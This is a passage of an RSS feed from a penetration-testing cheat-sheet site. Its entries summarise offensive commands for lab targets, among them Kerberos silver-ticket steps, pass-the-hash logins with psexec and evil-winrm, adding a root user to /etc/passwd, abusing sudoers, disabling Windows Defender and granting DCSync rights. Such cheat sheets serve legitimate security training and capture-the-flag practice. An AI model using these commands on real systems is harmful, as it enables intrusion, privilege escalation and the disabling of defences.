      <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) [optional] sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 $ iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;REGGIE1234ronnie&amp;#39;) | openssl dgst -md4 MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ sudo ntpdate -s dc.</description>
    </item>
    <item>
      <title>SMB Enum</title>
      <link>https://tldrbins.github.io/smb_enum/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smb_enum/</guid>
      <description>SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; $ sudo nmap --script=smb-enum-shares -p 445 10.10.11.207 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 04:53 GMT Nmap scan report for 10.10.11.207 Host is up (0.26s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds Anonymous Login smbmap smbclient impacket smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ $ smbclient -N -L \\\\10.</description>
    </item>
    <item>
      <title>SMB Server</title>
      <link>https://tldrbins.github.io/smb_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smb_server/</guid>
      <description>Start a SMB Server for File Transfer Anonymous Authenticate Older Windows impacket-smbserver share . -smb2support $ impacket-smbserver share . -smb2support Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed impacket-smbserver share . -smb2support -username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-smbserver share . -smb2support -username &amp;#39;test&amp;#39; -password &amp;#39;test&amp;#39; Impacket v0.</description>
    </item>
    <item>
      <title>SMTP</title>
      <link>https://tldrbins.github.io/smtp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smtp/</guid>
      <description>Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f&amp;#34;[+] Received a mail.&amp;#34;) print(&amp;#34;=&amp;#34; * 50) print(envelope.content.decode()) print(&amp;#34;=&amp;#34; * 50) return &amp;#34;250 OK&amp;#34; handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname=&amp;#34;0.0.0.0&amp;#34;, port=25) server.start() print(&amp;#34;[*] Listening on 0.0.0.0:25&amp;#34;) input(&amp;#34;[*] Server started. Press Return to quit.\n&amp;#34;) server.stop() Users Enum nmap script smtp-user-enum nmap -p 25 --script=smtp-enum-users &amp;lt;TARGET&amp;gt; # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t &amp;lt;TARGET&amp;gt; # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.</description>
    </item>
    <item>
      <title>SNMP</title>
      <link>https://tldrbins.github.io/snmp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/snmp/</guid>
      <description>Bruteforce commmuity string onesixtyone snmpbrute # Brute force community string for snmpwalk use onesixtyone &amp;lt;TARGET&amp;gt; -c /usr/share/doc/onesixtyone/dict.txt $ onesixtyone 10.10.11.248 -c /usr/share/doc/onesixtyone/dict.txt Scanning 1 hosts, 50 communities 10.10.11.248 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 Ref: onesixtyone&#xA;# Brute force community string (Check also SNMPv2) python3 snmpbrute.py -t &amp;lt;TARGET&amp;gt; $ python3 snmpbrute.py -t 10.10.11.248 _____ _ ____ _______ ____ __ / ___// | / / |/ / __ \ / __ )_______ __/ /____ \__ \/ |/ / /|_/ / /_/ / / __ / ___/ / / / __/ _ \ ___/ / /| / / / / ____/ / /_/ / / / /_/ / /_/ __/ /____/_/ |_/_/ /_/_/ /_____/_/ \__,_/\__/\___/ SNMP Bruteforce &amp;amp; Enumeration Script v2.</description>
    </item>
    <item>
      <title>SQL Injection</title>
      <link>https://tldrbins.github.io/sql_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sql_injection/</guid>
      <description>sqlmap # In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.</description>
    </item>
    <item>
      <title>SQLite</title>
      <link>https://tldrbins.github.io/sqlite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sqlite/</guid>
      <description>General # Open a db sqlite3 &amp;lt;DB_FILE&amp;gt; # Show tables .tables # Show schema of a table .schema &amp;lt;TABLE_NAME&amp;gt; # Show column headers .headers on # Dump data select * from &amp;lt;TABLE_NAME&amp;gt;; </description>
    </item>
    <item>
      <title>Squid Proxy</title>
      <link>https://tldrbins.github.io/squid_proxy/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/squid_proxy/</guid>
      <description>Config location /etc/squid/squid.conf Connect via FoxyProxy Firefox plugin +--------------------------+ | Settings | +--------------------------+ | Title : squid proxy | | Proxy Type : HTTP | | Proxy IP : &amp;lt;TARGET&amp;gt; | | Port : 3128 | | Username : (If any) | | Password : (If any) | +--------------------------+ # Connect http://&amp;lt;TARGET&amp;gt; # Or http://127.0.0.1 Internal ports scan via proxy # 1. Take note of word size, then Ctrl+C wfuzz -z range,1-1000 -p &amp;lt;TARGET&amp;gt;:3128:HTTP -u http://127.</description>
    </item>
    <item>
      <title>SSH</title>
      <link>https://tldrbins.github.io/ssh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ssh/</guid>
      <description>Check SSH version openssh-server (ubuntu)&#xA;openssh-server (debian)&#xA;Config Location /etc/ssh/sshd_config # Grep contents grep -Ev &amp;#34;^#&amp;#34; /etc/ssh/sshd_config | grep . Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Check Public Key ssh-keygen -l -f id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Convert .ppk to .pem format # Install sudo apt install putty-tools # Convert to private key in pem format puttygen key.</description>
    </item>
    <item>
      <title>SSL</title>
      <link>https://tldrbins.github.io/ssl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ssl/</guid>
      <description>Tools sslscan # Scan target SSL version sslscan &amp;lt;TARGET&amp;gt; Fix old ssl protocol connection problem # Edit /etc/ssl/openssl.cnf [system_default_sect] #MinProtocol = DEFAULT@SECLEVEL=2 MinProtocol = None #CipherString = DEFAULT@SECLEVEL=2 CipherString = None Note: Remember to revert the changes after job done</description>
    </item>
    <item>
      <title>Steganography</title>
      <link>https://tldrbins.github.io/steganography/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/steganography/</guid>
      <description>Tools exiftool steghide exiftool &amp;lt;FILE&amp;gt; # Always try with empty passphrase steghide extract -sf &amp;lt;FILE&amp;gt; </description>
    </item>
    <item>
      <title>Subdomain Enum</title>
      <link>https://tldrbins.github.io/subdomain_enum/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/subdomain_enum/</guid>
      <description>Add domain/subdomain to /etc/hosts echo &amp;#34;&amp;lt;TARGET_IP&amp;gt; &amp;lt;DOMAIN&amp;gt;&amp;#34; | sudo tee -a /etc/hosts wfuzz gobuster wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; -u &amp;lt;TARGET&amp;gt; Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; -u &amp;lt;TARGET&amp;gt; --hw &amp;lt;WORD&amp;gt; Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u &amp;lt;TARGET&amp;gt; gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.</description>
    </item>
    <item>
      <title>sudoers</title>
      <link>https://tldrbins.github.io/sudoers/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sudoers/</guid>
      <description>Abuse #1: Writable /etc/sudoers chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
    </item>
    <item>
      <title>TFTP</title>
      <link>https://tldrbins.github.io/tftp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/tftp/</guid>
      <description>TFTP # Connect tftp &amp;lt;TARGET&amp;gt; # Download get &amp;lt;FILE&amp;gt; # Exit quit Note: You need to know the exact filename, there is no directory listing in tftp</description>
    </item>
    <item>
      <title>Upgrade Shell</title>
      <link>https://tldrbins.github.io/upgrade_shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/upgrade_shell/</guid>
      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
    </item>
    <item>
      <title>VNC</title>
      <link>https://tldrbins.github.io/vnc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/vnc/</guid>
      <description>Basic # Connect vncviewer &amp;lt;TARGET&amp;gt;:5901 -passwd &amp;lt;SECRET_FILE&amp;gt; Note: secret is a cookie binary file</description>
    </item>
    <item>
      <title>Volume Shadow Copies</title>
      <link>https://tldrbins.github.io/volume_shadow_copies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/volume_shadow_copies/</guid>
      <description>Abuse #1: Recover data from shadow copies Windows 1. Check vssadmin list shadows PS C:\Windows\system32&amp;gt; vssadmin list shadows vssadmin list shadows vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp. Contents of shadow copy set ID: {001689e5-f1a7-40a8-8b5b-8b6371bd07ca} Contained 1 shadow copies at creation time: 9/9/2019 3:10:57 AM Shadow Copy ID: {046396e4-6312-45b7-96cd-5e5f6fb017ef} Original Volume: (C:)\\?\Volume{21385651-0000-0000-0000-602200000000}\ Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 Originating Machine: dev.htb.local Service Machine: dev.htb.local Provider: &amp;#39;Microsoft Software Shadow Copy provider 1.</description>
    </item>
    <item>
      <title>VPN</title>
      <link>https://tldrbins.github.io/vpn/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/vpn/</guid>
      <description>Enum # Check with ikeV1 ike-scan -M &amp;lt;TARGET&amp;gt; # Check with ikeV2 ike-scan -M --ikev2 &amp;lt;TARGET&amp;gt; Connect to VPN strongswan sudo apt install strongswan Settings # Edit /etc/ipsec.secrets %any : PSK &amp;lt;PASSWORD&amp;gt; # Edit /etc/ipsec.conf (copy from ike-scan result) config setup charondebug=&amp;#34;all&amp;#34; uniqueids=yes strictcrlpolicy=no conn testvpn authby=secret auto=add ike=3des-sha1-modp1024! esp=3des-sha1! type=transport keyexchange=ikev1 left=&amp;lt;LOCAL&amp;gt; right=&amp;lt;TARGET&amp;gt; rightsubnet=&amp;lt;TARGET&amp;gt;[tcp] Connect # Reset ipsec restart # Connect ipsec up testvpn </description>
    </item>
    <item>
      <title>Web Directory Enum</title>
      <link>https://tldrbins.github.io/web_directory_enum/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/web_directory_enum/</guid>
      <description>feroxbuster wfuzz gobuster bfac ds_walk HTTP feroxbuster -u &amp;lt;TARGET&amp;gt; --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links HTTPS feroxbuster -u &amp;lt;TARGET&amp;gt; -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links Specify Extension feroxbuster -u &amp;lt;TARGET&amp;gt; --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash &amp;apos;/&amp;apos; to each request feroxbuster -u &amp;lt;TARGET&amp;gt; -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt API Fuzzing feroxbuster -u &amp;lt;TARGET&amp;gt; --force-recursion -C 404,405 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Fuzzing Number Range wfuzz -z range,1-99 &amp;lt;TARGET&amp;gt;/FUZZ gobuster dir -u &amp;lt;TARGET&amp;gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.</description>
    </item>
    <item>
      <title>Webdav</title>
      <link>https://tldrbins.github.io/webdav/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/webdav/</guid>
      <description>Tools davtest curl # Without creds davtest -url http://&amp;lt;TARGET&amp;gt; # With creds davtest -url http://&amp;lt;TARGET&amp;gt; -auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; Ref: Download davtest&#xA;# Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://&amp;lt;TARGET&amp;gt;/&amp;lt;NEW_FILENAME&amp;gt;&amp;#39; http://&amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; </description>
    </item>
    <item>
      <title>whois</title>
      <link>https://tldrbins.github.io/whois/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/whois/</guid>
      <description>WHOIS # General whois &amp;lt;DOMAIN&amp;gt; # With specific server whois -h &amp;lt;WHOIS_SERVER&amp;gt; -p 43 &amp;lt;DOMAIN&amp;gt; </description>
    </item>
    <item>
      <title>Windows ACLs</title>
      <link>https://tldrbins.github.io/windows_acls/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_acls/</guid>
      <description>Window ACLs (Access Control Lists) Check ACLs powershell # Check a file/directory icacls &amp;lt;PATH&amp;gt; PS C:\xampp\htdocs\internal&amp;gt; icacls C:\xampp\htdocs\internal\applications icacls C:\xampp\htdocs\internal\applications C:\xampp\htdocs\internal\applications CREATOR OWNER:(OI)(CI)(IO)(F) OFFICE\PPotts:(OI)(CI)(NP)(F) NT AUTHORITY\SYSTEM:(OI)(CI)(F) NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F) OFFICE\web_account:(OI)(CI)(RX,W) BUILTIN\Administrators:(OI)(CI)(F) BUILTIN\Users:(OI)(CI)(RX) Successfully processed 1 files; Failed processing 0 files # Check all files and directories icacls * /C PS C:\xampp\htdocs\internal&amp;gt; icacls * /C icacls * /C applications CREATOR OWNER:(OI)(CI)(IO)(F) OFFICE\PPotts:(OI)(CI)(NP)(F) NT AUTHORITY\SYSTEM:(OI)(CI)(F) NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F) OFFICE\web_account:(OI)(CI)(RX,W) BUILTIN\Administrators:(OI)(CI)(F) BUILTIN\Users:(OI)(CI)(RX) css NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F) OFFICE\web_account:(I)(OI)(CI)(RX) NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F) BUILTIN\Administrators:(I)(OI)(CI)(F) BUILTIN\Users:(I)(OI)(CI)(RX) CREATOR OWNER:(I)(OI)(CI)(IO)(F) img NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F) OFFICE\web_account:(I)(OI)(CI)(RX) NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F) BUILTIN\Administrators:(I)(OI)(CI)(F) BUILTIN\Users:(I)(OI)(CI)(RX) CREATOR OWNER:(I)(OI)(CI)(IO)(F) index.</description>
    </item>
    <item>
      <title>Windows Defender</title>
      <link>https://tldrbins.github.io/windows_defender/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_defender/</guid>
      <description>Check Exclusion Path .\SharpExclusionFinder.exe &amp;#39;&amp;lt;PATH&amp;gt;&amp;#39; Ref: SharpExclusionFinder&#xA;Add Exclusion Path Add-MpPreference -ExclusionPath &amp;#39;&amp;lt;PATH&amp;gt;&amp;#39; Disable Defender Powershell # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path &amp;#34;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&amp;#34; -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force </description>
    </item>
    <item>
      <title>Windows Event Logs</title>
      <link>https://tldrbins.github.io/windows_event_logs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_event_logs/</guid>
      <description>Convert evtx to json evtx_dump ./evtx_dump -o jsonl -t 1 -f Security.json Security.evtx Ref: evtx_dump&#xA;Check number of logs wc -l Security.json Security Check computer name cat Security.json | jq &amp;#39;.Event.System.Computer&amp;#39; -r | sort | uniq -c | sort -nr Overview of event logs cat Security.json | jq &amp;#39;.Event.System.EventID&amp;#39; | sort | uniq -c | sort -nr Check specific event cat Security.json | jq &amp;#39;select(.Event.System.EventID==4624)&amp;#39; </description>
    </item>
    <item>
      <title>Windows RPC</title>
      <link>https://tldrbins.github.io/windows_rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_rpc/</guid>
      <description>Windows RPC impacket IOXIDResolver # Show mappings impacket-rpcmap &amp;#39;ncacn_ip_tcp:&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-rpcmap &amp;#39;ncacn_ip_tcp:10.10.10.213&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra ...[SNIP]... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 ...[SNIP]... # Get network interface without auth python3 IOXIDResolver.py -t &amp;lt;TARGET&amp;gt; $ python3 IOXIDResolver.py -t 10.10.10.213 [*] Retrieving network interface of 10.10.10.213 Address: apt Address: 10.10.10.213 Address: dead:beef::b885:d62a:d679:573f Ref: IOXIDResolver</description>
    </item>
    <item>
      <title>Windows Services</title>
      <link>https://tldrbins.github.io/server_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/server_operators/</guid>
      <description>Check unquoted service path cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; PS C:\Users\user1&amp;gt; cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; WC Assistant WCAssistantService C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe Auto Check service ACLs . .\Get-ServiceAcl &amp;#34;&amp;lt;SERVICE&amp;gt;&amp;#34; | Get-ServiceAcl | Select -ExpandProperty Access PS &amp;gt; &amp;#34;SomeService&amp;#34; | Get-ServiceAcl | select -ExpandProperty Access ...[SNIP]... ServiceRights : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl AccessControlType : AccessAllowed IdentityReference : COMPUTER-MS01\user IsInherited : False InheritanceFlags : None PropagationFlags : None .</description>
    </item>
    <item>
      <title>Winrm</title>
      <link>https://tldrbins.github.io/winrm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm/</guid>
      <description>Psexec Password Hash # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; Evil-Winrm Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &amp;#39;qwe123QWE!@#&amp;#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.</description>
    </item>
    <item>
      <title>Winrm from Windows VM</title>
      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
    </item>
    <item>
      <title>Wordpress</title>
      <link>https://tldrbins.github.io/wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/wordpress/</guid>
      <description>Default config location /var/www/html/wp-config.php Tools wpscan # HTTP wpscan --url &amp;lt;TARGET&amp;gt; -e ap,t,tt,u # HTTPS wpscan --url &amp;lt;TARGET&amp;gt; -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url &amp;lt;TARGET&amp;gt; -e ap,t,tt,u --api-token &amp;lt;API_KEY&amp;gt; # Brute force wp-admin wpscan --url &amp;lt;TARGET&amp;gt; --passwords passwords.txt --usernames admin Ref: Get Free API key</description>
    </item>
    <item>
      <title>Writable /etc/passwd</title>
      <link>https://tldrbins.github.io/passwd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/passwd/</guid>
      <description>Abuse #1: Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo &amp;#39;user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash&amp;#39; &amp;gt;&amp;gt; /etc/passwd # Get root shell su - user </description>
    </item>
    <item>
      <title>WriteDacl</title>
      <link>https://tldrbins.github.io/writedacl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writedacl/</guid>
      <description>Abuse #1: Add dcsync right to user Linux Windows powerview.py&#xA;1. Connect to DC # With password powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; # With hash powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -H &amp;lt;HASH&amp;gt; $ powerview &amp;#39;CORP.LOCAL/WEB01$@172.16.1.5&amp;#39; -H 7ddf32e17a6ac5ce04a8ecbf782ca509 (LDAP)-[DC01.corp.local]-[CORP\WEB01$] PV &amp;gt; 2. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -TargetIdentity &amp;#39;&amp;lt;TARGET_IDENTITY&amp;gt;&amp;#39; -Rights DCSync (LDAP)-[DC01.corp.local]-[CORP\WEB01$] PV &amp;gt; Add-DomainObjectAcl -PrincipalIdentity &amp;#39;WEB01$&amp;#39; -TargetIdentity &amp;#39;DC=corp,DC=local&amp;#39; -Rights DCSync [2024-10-01 12:51:36] [Add-DomainObjectACL] Found target identity: DC=corp,DC=local [2024-10-01 12:51:36] [Add-DomainObjectACL] Found principal identity: CN=WEB01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local [2024-10-01 12:51:36] DACL modified successfully!</description>
    </item>
    <item>
      <title>WriteOwner/Own</title>
      <link>https://tldrbins.github.io/writeowner/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writeowner/</guid>
